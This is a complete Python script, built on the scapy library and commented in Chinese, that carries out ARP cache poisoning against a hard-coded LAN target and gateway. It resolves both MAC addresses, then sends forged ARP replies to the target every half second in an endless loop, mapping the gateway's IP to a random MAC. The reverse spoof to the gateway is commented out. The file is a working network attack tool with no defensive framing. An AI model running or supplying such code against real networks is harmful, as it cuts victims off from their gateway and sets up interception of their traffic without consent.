from scapy.all import ARP, Ether, sendp, srp, RandMAC
import time
import sys


def get_mac(ip):
    """
    获取目标IP地址的MAC地址
    """
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, verbose=False)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
    return None


def arp_poison(target_ip, target_mac, host_ip, host_mac):
    """
    向目标和主机发送伪造的ARP回复,欺骗目标和主机的ARP缓存
    """
    # 构建欺骗目标的ARP包
    arp_target = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=RandMAC())
    # 构建欺骗主机的ARP包
    arp_host = ARP(op=2, pdst=host_ip, psrc=target_ip, hwdst=RandMAC())

    while True:
        sendp(Ether(dst=target_mac) / arp_target, verbose=False)
        # sendp(Ether(dst=host_mac) / arp_host, verbose=False)
        time.sleep(0.5)


if __name__ == "__main__":

    target_ip = "192.168.102.209"
    host_ip = "192.168.100.1"

    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)

    if target_mac is None:
        print(f"Failed to get MAC address for target IP {target_ip}")
        sys.exit(1)

    if host_mac is None:
        print(f"Failed to get MAC address for host IP {host_ip}")
        sys.exit(1)

    print(f"Starting ARP poisoning: {target_ip} ({target_mac}) <--> {host_ip} ({host_mac})")

    try:
        arp_poison(target_ip, target_mac, host_ip, host_mac)
    except KeyboardInterrupt:
        sys.exit(0)
